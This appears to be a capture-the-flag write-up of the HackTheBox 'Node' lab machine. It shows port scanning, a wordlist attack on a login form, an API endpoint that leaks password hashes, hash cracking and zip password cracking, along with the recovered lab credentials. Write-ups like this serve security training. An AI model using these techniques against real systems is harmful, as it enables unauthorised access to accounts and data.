# Node | HackTheBox

### 1. Scan
```
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.71.65
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 02:16 UTC
Nmap scan report for 10.129.71.65
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   221.35 ms 10.10.14.1
2   222.80 ms 10.129.71.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.25 seconds
```
The machine is running SSH and Apache Hardoop on port 3000.

### 2. Enumeration
Going to the HTTP site on the Hardoop port shows a budding social media website called "MyPlace". The front page shows there are three new members: tom, mark and rastating.  
Running a dirbust against the site can be done by specifying a bad string in the response since every request returns 200, but nothing of any real interest is discovered.  
There is a login page - I create a script to conduct a wordlist attack on the login form since there is no protection against bruteforce (see loginattack.py).
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ ./loginattack.py 
[+] Attempting wordlist attack for tom...
Attempts for tom: 0
[+] Login - tom:spongebob
[+] Attempting wordlist attack for mark...
Attempts for mark: 0
Attempts for mark: 100
Attempts for mark: 200
Attempts for mark: 300
Attempts for mark: 400
Attempts for mark: 500
Attempts for mark: 600
Attempts for mark: 700
Attempts for mark: 800
Attempts for mark: 900
Attempts for mark: 1000
Attempts for mark: 1100
Attempts for mark: 1200
Attempts for mark: 1300
Attempts for mark: 1400
[+] Login - mark:snowflake
[+] Attempting wordlist attack for rastating...
Attempts for rastating: 0
Attempts for rastating: 100
Attempts for rastating: 200
Attempts for rastating: 300
Attempts for rastating: 400
Attempts for rastating: 500
...
```
Two sets of credentials are recovered: `tom:spongebob` and `mark:snowflake`.  
Logging in as these users gives only a single page indicating there is no functionality for non-admin users. From here it can be concluded that these users are a dead end.
  
Taking a look at the site in Burpsuite, the pages are retrieving information from several endpoints. One is used to the the list of latest users: `/api/users/latest`.  
By changing this to `/api/users` the response returns a list of users and their password hashes.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ curl --silent http://10.129.71.65:3000/api/users | jq
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```
Searching online for the admin's hash completes a set of valid admin credentials: `myP14ceAdm1nAcc0uNT:manchester`.

### 3. Log in to the admin page
The admin's dashboard has a single link to download a backup.
```bash
divip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
```
The file's contents is base64 encoded.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ cat myplace.backup | base64 -d > backup.zip
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ file backup.zip 
backup.zip: Zip archive data, at least v1.0 to extract
```
The zipfile has a password, but it does appear in a wordlist so it can be recovered.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ fcrackzip --dictionary -p rockyou.txt -u backup.zip 


PASSWORD FOUND!!!!: pw == magicword
```
The backup file can now be unzipped, which recovers the source code to the entire application.

